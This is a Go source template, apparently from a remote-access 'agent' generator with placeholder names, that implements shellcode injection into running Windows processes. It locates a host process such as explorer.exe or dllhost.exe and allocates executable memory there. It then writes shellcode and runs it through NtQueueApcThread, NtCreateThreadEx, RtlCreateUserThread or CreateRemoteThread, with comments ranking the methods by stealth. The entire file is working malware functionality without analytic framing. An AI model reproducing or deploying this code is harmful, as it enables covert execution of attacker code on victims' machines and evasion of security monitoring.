import (
	"encoding/base64"
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// Shellcode injection functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
	processName = strings.ToLower(processName)

	// Create a snapshot of all processes in the system
	snapshot := createToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshot == 0 {
		return 0, fmt.Errorf("failed to create process snapshot")
	}
	defer func() {
		syscall.CloseHandle(syscall.Handle(snapshot))
	}()

	// Initialize the PROCESSENTRY32 structure
	var pe PROCESSENTRY32
	pe.Size = uint32(unsafe.Sizeof(pe))

	// Get the first process
	if !process32First(snapshot, &pe) {
		return 0, fmt.Errorf("failed to get first process")
	}

	// Iterate through all processes
	for {
		// Convert the wide string to a regular string for comparison
		exeName := syscall.UTF16ToString(pe.ExeFile[:])
		if strings.ToLower(exeName) == processName || strings.ToLower(strings.TrimSuffix(exeName, ".exe")) == processName {
			return pe.ProcessID, nil
		}

		// Get the next process
		if !process32Next(snapshot, &pe) {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", processName)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) string {
	return a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcode, "auto")
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcode []byte, technique string, pid uint32) string {
	// If PID is provided, use it directly; otherwise find a target process
	var targetProcess string
	var err error

	if pid == 0 {
		// No PID provided, find a target process (original behavior)
		possibleTargets := []string{"dllhost.exe", "taskhost.exe", "conhost.exe", "notepad.exe", "explorer.exe"}
		targetProcess = ""
		err = fmt.Errorf("no target processes found")

		for _, target := range possibleTargets {
			pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}(target)
			if err == nil {
				targetProcess = target
				break
			}
		}

		if err != nil {
			return fmt.Sprintf("[ERROR] Could not find any suitable target process: %v", err)
		}
	} else {
		// PID provided, try to get the process name for display purposes
		targetProcess = fmt.Sprintf("PID:%d", pid)
	}

	// Open the target process with all necessary permissions
	processHandle := openProcess(PROCESS_ALL_ACCESS, 0, pid)
	if processHandle == 0 {
		return fmt.Sprintf("[ERROR] Failed to open target process %s (PID: %d)", targetProcess, pid)
	}
	defer closeHandle(processHandle)

	// Convert technique to lowercase for comparison
	technique = strings.ToLower(technique)

	// Execute based on the specified technique
	switch technique {
	case "apc", "ntqueueapc":
		// Technique 1: NtQueueApcThread with thread enumeration (most stealthy)
		allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				// Enumerate threads in the target process
				threadSnapshot := createToolhelp32Snapshot(0x00000004, 0) // TH32CS_SNAPTHREAD
				if threadSnapshot != 0 {
					defer closeHandle(threadSnapshot)

					var te THREADENTRY32
					te.Size = uint32(unsafe.Sizeof(te))

					if thread32First(threadSnapshot, &te) {
						for {
							if te.OwnerProcessID == pid {
								threadHandle := openProcess(THREAD_ALL_ACCESS, 0, te.ThreadID)
								if threadHandle != 0 {
									// Try NtQueueApcThread as the most stealthy approach
									result := ntQueueApcThread(threadHandle, allocAddress, 0, 0, 0)
									if result == 0 { // Success
										closeHandle(threadHandle)
										return fmt.Sprintf("[SUCCESS] Shellcode queued to thread %d in %s (PID: %d) using NtQueueApcThread", te.ThreadID, targetProcess, pid)
									}
									closeHandle(threadHandle)
								}
							}
							if !thread32Next(threadSnapshot, &te) {
								break
							}
						}
					}
				}
			}
		}
		return fmt.Sprintf("[ERROR] NtQueueApcThread injection failed for %s (PID: %d)", targetProcess, pid)

	case "ntcreatethread", "ntcreatethreadex":
		// Technique 2: NtCreateThreadEx (more stealthy)
		allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var newThreadHandle uintptr
				result := ntCreateThreadEx(&newThreadHandle, THREAD_ALL_ACCESS, 0, processHandle, allocAddress, 0, 0, 0, 0, 0, 0)
				if result == 0 {
					// Don't wait for the thread to finish to avoid blocking the agent
					closeHandle(newThreadHandle)
					return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d) using NtCreateThreadEx", targetProcess, pid)
				}
			}
		}
		return fmt.Sprintf("[ERROR] NtCreateThreadEx injection failed for %s (PID: %d)", targetProcess, pid)

	case "rtlcreateuser", "rtlcreateuserthread":
		// Technique 3: RtlCreateUserThread
		allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var userThreadHandle uintptr
				var clientId CLIENT_ID
				result := rtlCreateUserThread(processHandle, 0, false, 0, 0, 0, allocAddress, 0, &userThreadHandle, &clientId)
				if result == 0 {
					// Don't wait for the thread to finish to avoid blocking the agent
					closeHandle(userThreadHandle)
					return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d) using RtlCreateUserThread", targetProcess, pid)
				}
			}
		}
		return fmt.Sprintf("[ERROR] RtlCreateUserThread injection failed for %s (PID: %d)", targetProcess, pid)

	case "createremote", "createremotethread":
		// Technique 4: Classic CreateRemoteThread injection (original stable method, least stealthy)
		allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if allocAddress != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var oldProtect uint32
				success = virtualProtectEx(processHandle, allocAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, &oldProtect)
				if success {
					var threadID uint32
					threadHandle := createRemoteThread(processHandle, 0, 0, allocAddress, 0, 0, &threadID)
					if threadHandle != 0 {
						// Don't wait for the thread to finish to avoid blocking the agent
						closeHandle(threadHandle)
						return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d), thread ID: %d", targetProcess, pid, threadID)
					}
				}
			}
		}
		return fmt.Sprintf("[ERROR] CreateRemoteThread injection failed for %s (PID: %d)", targetProcess, pid)

	case "auto", "":
		// Default behavior: try techniques in order of stealthiness
		// Technique 1: NtQueueApcThread with thread enumeration (most stealthy)
		allocAddress1 := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress1 != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress1, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				// Enumerate threads in the target process
				threadSnapshot := createToolhelp32Snapshot(0x00000004, 0) // TH32CS_SNAPTHREAD
				if threadSnapshot != 0 {
					defer closeHandle(threadSnapshot)

					var te THREADENTRY32
					te.Size = uint32(unsafe.Sizeof(te))

					if thread32First(threadSnapshot, &te) {
						for {
							if te.OwnerProcessID == pid {
								threadHandle := openProcess(THREAD_ALL_ACCESS, 0, te.ThreadID)
								if threadHandle != 0 {
									// Try NtQueueApcThread as the most stealthy approach
									result := ntQueueApcThread(threadHandle, allocAddress1, 0, 0, 0)
									if result == 0 { // Success
										closeHandle(threadHandle)
										return fmt.Sprintf("[SUCCESS] Shellcode queued to thread %d in %s (PID: %d) using NtQueueApcThread", te.ThreadID, targetProcess, pid)
									}
									closeHandle(threadHandle)
								}
							}
							if !thread32Next(threadSnapshot, &te) {
								break
							}
						}
					}
				}
			}
		}

		// Technique 2: NtCreateThreadEx (more stealthy)
		allocAddress2 := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress2 != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress2, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var newThreadHandle uintptr
				result := ntCreateThreadEx(&newThreadHandle, THREAD_ALL_ACCESS, 0, processHandle, allocAddress2, 0, 0, 0, 0, 0, 0)
				if result == 0 {
					// Don't wait for the thread to finish to avoid blocking the agent
					closeHandle(newThreadHandle)
					return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d) using NtCreateThreadEx", targetProcess, pid)
				}
			}
		}

		// Technique 3: RtlCreateUserThread
		allocAddress3 := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddress3 != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress3, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var userThreadHandle uintptr
				var clientId CLIENT_ID
				result := rtlCreateUserThread(processHandle, 0, false, 0, 0, 0, allocAddress3, 0, &userThreadHandle, &clientId)
				if result == 0 {
					// Don't wait for the thread to finish to avoid blocking the agent
					closeHandle(userThreadHandle)
					return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d) using RtlCreateUserThread", targetProcess, pid)
				}
			}
		}

		// Technique 4: Classic CreateRemoteThread injection (original stable method, least stealthy)
		allocAddress4 := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if allocAddress4 != 0 {
			var bytesWritten uintptr
			success := writeProcessMemory(processHandle, allocAddress4, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
			if success {
				var oldProtect uint32
				success = virtualProtectEx(processHandle, allocAddress4, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, &oldProtect)
				if success {
					var threadID uint32
					threadHandle := createRemoteThread(processHandle, 0, 0, allocAddress4, 0, 0, &threadID)
					if threadHandle != 0 {
						// Don't wait for the thread to finish to avoid blocking the agent
						closeHandle(threadHandle)
						return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d), thread ID: %d", targetProcess, pid, threadID)
					}
				}
			}
		}

		return fmt.Sprintf("[ERROR] All shellcode injection techniques failed for %s (PID: %d)", targetProcess, pid)

	default:
		return fmt.Sprintf("[ERROR] Unknown injection technique: %s. Valid options: apc, ntcreatethread, rtlcreateuser, createremote, auto", technique)
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcode []byte, technique string) string {
	// Call the new function with PID 0 (original behavior)
	return a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique_and_pid(shellcode, technique, 0)
}